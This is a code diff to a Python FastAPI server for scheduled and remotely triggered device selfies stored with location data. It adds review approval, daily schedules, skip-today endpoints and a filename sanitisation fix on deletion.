-    c.execute('''INSERT INTO selfies (device_id, filename, timestamp, unix_time, battery, lat, lon)
-                 VALUES (?, ?, ?, ?, ?, ?, ?)''',
-              (device_id, filename, time_str, now_unix, battery, lat, lon))
+    c.execute('''INSERT INTO selfies (device_id, filename, timestamp, unix_time, battery, lat, lon, review_status)
+                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
+              (device_id, filename, time_str, now_unix, battery, lat, lon, 'pending'))
     db.commit()
     
     return {"status": "success", "filename": filename}
@@ -927,6 +1210,44 @@ async def force_selfie(device_id: str = Form(...), request: Request = Depends(ve
     if device_id in ws_manager.active_connections:
         await ws_manager.send_task(device_id, {"task": "force_selfie"})
     return {"status": "success"}
+
+@app.get("/selfie_schedule")
+async def selfie_schedule(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
+    verify_session(request)
+    row = ensure_selfie_schedule(device_id, db)
+    return {
+        "device_id": device_id,
+        "next_run_at": row["next_run_at"],
+        "enabled": row["enabled"],
+        "dev_mode": row["dev_mode"]
+    }
+
+@app.post("/set_selfie_schedule")
+async def set_selfie_schedule(
+    device_id: str = Form(...),
+    scheduled_time: str = Form(...),
+    enabled: int = Form(1),
+    dev_mode: int = Form(1),
+    auth: bool = Depends(verify_session),
+    db: sqlite3.Connection = Depends(get_db)
+):
+    ensure_selfie_schedule(device_id, db)
+    next_run_at = get_next_run_at_for_time_string(scheduled_time)
+    c = db.cursor()
+    c.execute("UPDATE selfie_schedule SET next_run_at = ?, enabled = ?, dev_mode = ?, updated_at = ? WHERE device_id = ?",
+              (next_run_at, to_int(enabled, 1), to_int(dev_mode, 1), time.time(), device_id))
+    db.commit()
+    return {"status": "success", "next_run_at": next_run_at, "enabled": to_int(enabled, 1), "dev_mode": to_int(dev_mode, 1)}
+
+
+@app.post("/review_selfie")
+async def review_selfie(selfie_id: int = Form(...), action: str = Form(...), auth: bool = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
+    status = "approved" if action == "approve" else "denied"
+    reviewed_at = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
+    c = db.cursor()
+    c.execute("UPDATE selfies SET review_status = ?, reviewed_at = ? WHERE id = ?", (status, reviewed_at, selfie_id))
+    db.commit()
+    return {"status": "success", "review_status": status, "reviewed_at": reviewed_at}
 
 
 @app.get("/selfie_list")
@@ -939,10 +1260,10 @@ async def selfie_list(
     verify_session(request)
     c = db.cursor()
     if date:
-        c.execute("SELECT id, filename, timestamp, unix_time, battery, lat, lon FROM selfies WHERE device_id = ? AND timestamp LIKE ? ORDER BY id DESC",
+        c.execute("SELECT id, filename, timestamp, unix_time, battery, lat, lon, review_status, reviewed_at FROM selfies WHERE device_id = ? AND timestamp LIKE ? ORDER BY unix_time DESC",
                   (device_id, f"{date}%"))
     else:
-        c.execute("SELECT id, filename, timestamp, unix_time, battery, lat, lon FROM selfies WHERE device_id = ? ORDER BY id DESC LIMIT 100",
+        c.execute("SELECT id, filename, timestamp, unix_time, battery, lat, lon, review_status, reviewed_at FROM selfies WHERE device_id = ? ORDER BY unix_time DESC LIMIT 100",
                   (device_id,))
     rows = c.fetchall()
     result = []
@@ -950,11 +1271,13 @@ async def selfie_list(
         result.append({
             "id": r["id"],
             "filename": r["filename"],
-            "url": f"/static/selfies/{r['filename']}",
+            "url": f"/media/selfies/{r['filename']}",
             "timestamp": r["timestamp"],
             "battery": r["battery"],
             "lat": r["lat"],
-            "lon": r["lon"]
+            "lon": r["lon"],
+            "review_status": r["review_status"],
+            "reviewed_at": r["reviewed_at"]
         })
     return {"selfies": result}
 
@@ -969,13 +1292,50 @@ async def selfie_dates(device_id: str, request: Request, db: sqlite3.Connection 
     return {"dates": [{"date": r["date"], "count": r["count"]} for r in rows]}
 
 
+@app.post("/skip_selfie_today")
+async def skip_selfie_today(device_id: str = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
+    today = time.strftime('%Y-%m-%d', time.localtime())
+    timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
+    c = db.cursor()
+    c.execute("INSERT OR IGNORE INTO selfie_skips (device_id, skip_date, timestamp, unix_time) VALUES (?, ?, ?, ?)",
+              (device_id, today, timestamp, time.time()))
+    ensure_selfie_schedule(device_id, db)
+    c.execute("SELECT next_run_at FROM selfie_schedule WHERE device_id = ?", (device_id,))
+    row = c.fetchone()
+    if row and row["next_run_at"]:
+        next_run = parse_datetime_string(row["next_run_at"])
+        if next_run and next_run.date() == datetime.now().date():
+            next_run = next_run + timedelta(days=1)
+            c.execute("UPDATE selfie_schedule SET next_run_at = ?, updated_at = ? WHERE device_id = ?",
+                      (format_datetime_string(next_run), time.time(), device_id))
+    db.commit()
+    return {"status": "ok", "skipped_today": True, "date": today}
+
+@app.post("/unskip_selfie_today")
+async def unskip_selfie_today(device_id: str = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
+    today = time.strftime('%Y-%m-%d', time.localtime())
+    c = db.cursor()
+    c.execute("DELETE FROM selfie_skips WHERE device_id = ? AND skip_date = ?", (device_id, today))
+    db.commit()
+    return {"status": "ok", "skipped_today": False, "date": today}
+
+@app.get("/selfie_skip_status")
+async def selfie_skip_status(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
+    verify_session(request)
+    today = time.strftime('%Y-%m-%d', time.localtime())
+    c = db.cursor()
+    c.execute("SELECT 1 FROM selfie_skips WHERE device_id = ? AND skip_date = ? LIMIT 1", (device_id, today))
+    skipped = c.fetchone() is not None
+    return {"skipped_today": skipped, "date": today}
+
 @app.post("/delete_selfie")
 async def delete_selfie(selfie_id: int = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
     c = db.cursor()
     c.execute("SELECT filename FROM selfies WHERE id = ?", (selfie_id,))
     row = c.fetchone()
     if row:
-        filepath = os.path.join("static/selfies", row["filename"])
+        safe_name = os.path.basename(row["filename"])
+        filepath = os.path.join(SELFIE_DIR, safe_name)
         if os.path.exists(filepath):
             os.remove(filepath)
         c.execute("DELETE FROM selfies WHERE id = ?", (selfie_id,))
